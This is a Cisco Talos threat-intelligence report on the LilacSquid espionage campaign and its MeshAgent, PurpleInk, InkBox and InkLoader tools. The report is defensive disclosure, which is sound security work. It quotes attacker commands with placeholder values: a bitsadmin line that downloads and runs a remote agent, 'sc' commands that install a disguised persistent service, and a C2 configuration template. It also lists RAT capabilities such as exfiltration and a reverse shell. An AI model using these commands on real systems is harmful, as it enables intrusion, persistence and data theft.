LilacSquid: The stealthy trilogy of PurpleInk,
InkBox and InkLoader
Asheer Malhotra ⋮ ⋮ 5/30/2024
By Anna Bennett, Nicole Hoffman, Asheer Malhotra, Sean Taylor and Brandon White. 
Cisco Talos is disclosing a new suspected data theft campaign, active since at least 2021, we
attribute to an advanced persistent threat actor (APT) we’re calling “LilacSquid.”  
LilacSquid’s victimology includes a diverse set of victims consisting of information technology
organizations building software for the research and industrial sectors in the United States,
organizations in the energy sector in Europe and the pharmaceutical sector in Asia indicating that
the threat actor (TA) may be agnostic of industry verticals and trying to steal data from a variety of
sources.  
This campaign uses MeshAgent, an open-source remote management tool, and a customized
version of QuasarRAT we’re calling “PurpleInk” to serve as the primary implants after successfully
compromising vulnerable application servers exposed to the internet.  
This campaign leverages vulnerabilities in public-facing application servers and compromised
remote desktop protocol (RDP) credentials to orchestrate the deployment of a variety of open-
source tools, such as MeshAgent and SSF, alongside customized malware, such as "PurpleInk,"
and two malware loaders we are calling "InkBox" and "InkLoader.”  
The campaign is geared toward establishing long-term access to compromised victim organizations
to enable LilacSquid to siphon data of interest to attacker-controlled servers.

LilacSquid – An espionage-motivated threat
actor 
Talos assesses with high confidence that this campaign has been active since at least 2021 and the
successful compromise and post-compromise activities are geared toward establishing long-term access
for data theft by an advanced persistent threat (APT) actor we are tracking as "LilacSquid" and UAT-
4820. Talos has observed at least three successful compromises spanning entities in Asia, Europe and
the United States consisting of industry verticals such as pharmaceuticals, oil and gas, and technology. 
Previous intrusions into software manufacturers, such as the 3CX and X_Trader compromises by
Lazarus, indicate that unauthorized long-term access to organizations that manufacture and distribute
popular software for enterprise and industrial organizations can open avenues of supply chain
compromise proving advantageous to threat actors such as LilacSquid, allowing them to widen their net
of targets.  
We have observed two different types of initial access techniques deployed by LilacSquid, including
exploiting vulnerabilities and the use of compromised remote desktop protocol (RDP) credentials. Post-
exploitation activity in this campaign consists of the deployment of MeshAgent, an open-source remote
management and desktop session application, and a heavily customized version of QuasarRAT that we
track as “PurpleInk” allowing LilacSquid to gain complete control over the infected systems. Additional
means of persistence used by LilacSquid include the use of open-source tools such as Secure Socket
Funneling (SSF), which is a tool for proxying and tunneling multiple sockets through a single secure TLS
tunnel to a remote computer. 
It is worth noting that multiple tactics, techniques, tools and procedures (TTPs) utilized in this campaign
bear some overlap with North Korean APT groups, such as Andariel and its parent umbrella group,
Lazarus. Public reporting has noted Andariel’s use of MeshAgent as a tool for maintaining post-
compromise access after successful exploitation. Furthermore, Talos has observed Lazarus extensively
use SOCKs proxy and tunneling tools, along with custom-made malware as part of their post-
compromise playbooks to act as channels of secondary access and exfiltration. This tactic has also been
seen in this campaign operated by LilacSquid where the threat actor deployed SSF along with other
malware to create tunnels to their remote servers. 
LilacSquid’s infection chains 
There are primarily two types of infection chains that LilacSquid uses in this campaign. The first involves
the successful exploitation of a vulnerable web application, while the other is the use of compromised
RDP credentials. Successful compromise of a system leads to LilacSquid deploying multiple vehicles of
access onto compromised hosts, including dual-use tools such as MeshAgent, Secure Socket Funneling
(SSF), InkLoader and PurpleInk. 
Successful exploitation of the vulnerable application results in the attackers deploying a script that will set
up working directories for the malware and then download and execute MeshAgent from a remote server.
On execution, MeshAgent will connect to its C2, carry out preliminary reconnaissance and begin
downloading and activating other implants on the system, such as SSF and PurpleInk. 
3/9
MeshAgent is typically downloaded by the attackers using the bitsadmin utility and then executed to
establish contact with the C2: 
bitsadmin /transfer -job_name- /download /priority normal -remote_URL- -local_path_for_MeshAgent- 
-
local_path_for_MeshAgent- connect 
Instrumenting InkLoader – Modularizing the infection chain 
When compromised RDP credentials were used to gain access, the infection chain was altered slightly.
LilacSquid chose to either deploy MeshAgent and subsequent implants, or introduce another component
in the infection preceding PurpleInk.  
InkLoader is a simple, yet effective DOT NET-based malware loader. It is written to run a hardcoded
executable or command. In this infection chain, InkLoader is the component that persists across reboots
on the infected host instead of the actual malware it runs. So far, we have only seen PurpleInk being
executed via InkLoader, but LilacSquid may likely use InkLoader to deploy additional malware implants. 
Talos observed LilacSquid deploy InkLoader in conjunction with PurpleInk only when they could
successfully create and maintain remote sessions via remote desktop (RDP) by exploiting the use of
4/9
stolen credentials to the target host. A successful login via RDP leads to the download of InkLoader and
PurpleInk, copying these artifacts into desired directories on disk and the subsequent registration of
InkLoader as a service that is then started to deploy InkLoader and, in turn, PurpleInk. The infection chain
can be visualized as: 
Service creation and execution on the endpoint is typically done via the command line interface using the
commands: 
sc create TransactExDetect displayname=Extended Transaction Detection 
binPath= _filepath_of_InkLoader_ start= auto 
sc description TransactExDetect Extended Transaction Detection for Active 
Directory domain hosts 
sc start TransactExDetect 
PurpleInk – LilacSquid's bespoke implant 
PurpleInk, LilacSquid’s primary implant of choice, has been adapted from QuasarRAT, a popular remote
access trojan family. Although QuasarRAT has been available to threat actors since at least 2014, we
observed PurpleInk being actively developed starting in 2021 and continuing to evolve its functionalities
separate from its parent malware family.  
PurpleInk uses an accompanying configuration file to obtain information such as the C2 server’s address
and port. This file is typically base64-decoded and decrypted to obtain the configuration strings required
by PurpleInk. 
PurpleInk is a highly versatile implant that is heavily obfuscated and contains a variety of RAT
capabilities. Talos has observed multiple variants of PurpleInk where functionalities have both been
5/9
introduced and removed. 
In terms of RAT capabilities, PurpleInk can perform the following actions on the infected host: 
Enumerate the process and send the process ID, name and associated Window Title to the C2. 
Terminate a process ID (PID) specified by the C2 on the infected host. 
Run a new application on the host – start process. 
Get drive information for the infected host, such as volume labels, root directory names, drive type
and drive format. 
Enumerate a given directory to obtain underlying directory names, file names and file sizes. 
Read a file specified by the C2 and exfiltrate its contents. 
Replace or append content to a specified file. 
Gather system information about the infected host using WMI queries. Information includes:

Delete files and directories specified by the C2. 
Connect to a specified remote address, specified by the C2. This remote address referenced as
“Friend” internally is the reverse proxy host indicating that PurpleInk can act as an intermediate
proxy tool. 
PurpleInk has the following capabilities related to communicating with its “friends” (proxy servers): 
Connect to a new friend whose remote address is specified by the C2. 
Send data to a new or existing friend. 
Disconnect from a specified friend. 
Receive data from another connected friend and process it. 
Another PurpleInk variant, built and deployed in 2023 and 2024, consists of limited functionalities, with
much of its capabilities stripped out. The capabilities that still reside in this variant are the abilities to: 
Close all connections to proxy servers. 
Create a reverse shell.  
Connect and send/receive data from connected proxies. 
Functionalities, such as file management, execution and gathering system information, have been
stripped out of this variant of PurpleInk, but can be supplemented by the reverse shell carried over from
previous variants, which can be used to carry out these tasks on the infected endpoint. Adversaries
frequently strip, add and stitch together functionalities to reduce their implant’s footprint on the infected
system to avoid detection or to improve their implementations to remove redundant capabilities.  
InkBox – Custom loader observed in older
attacks 
InkBox is a malware loader that will read from a hardcoded file path on disk and decrypt its contents. The
decrypted content is another executable assembly that is then run by invoking its Entry Point within the
InkBox process. This second assembly is the backdoor PurpleInk. The overall infection chain in this case
is: 
7/9
The usage of InkBox to deploy PurpleInk is an older technique used by LilacSquid since 2021. Since
2023, the threat actor has produced another variant of the infection chain where they have modularized
the infection chain so that PurpleInk can now run as a separate process. However, even in this new
infection chain, PurpleInk is still run via another component that we call "InkLoader.”  
LilacSquid employs MeshAgent 
In this campaign, LilacSquid has extensively used MeshAgent as the first stage of their post-compromise
activity. MeshAgent is the agent/client from the MeshCentral, an open-source remote device
management software. The MeshAgent binaries typically use a configuration file, known as an MSH file.
The MSH files in this campaign contain information such as MeshName (victim identifier in this case) and
C2 addresses: 
MeshName=-Name_of_mesh- 
MeshType=-Type_of_mesh- 
MeshID=0x-Mesh_ID_hex- 
ServerID=-Server_ID_hex- 
MeshServer=wss://-Mesh_C2_Address-
Translation=-keywords_translation_JSON-
Being a remote device management utility, MeshAgent allows an operator to control almost all aspects of
the device via the MeshCentral server, providing capabilities such as: 
List all devices in the Mesh (list of victims). 
View and control desktop. 
Manage files on the system. 
View software and hardware information about the device.  
8/9
Post-exploitation, MeshAgent activates other dual-use and malicious tools on the infected systems, such
as SSF and PurpleInk.
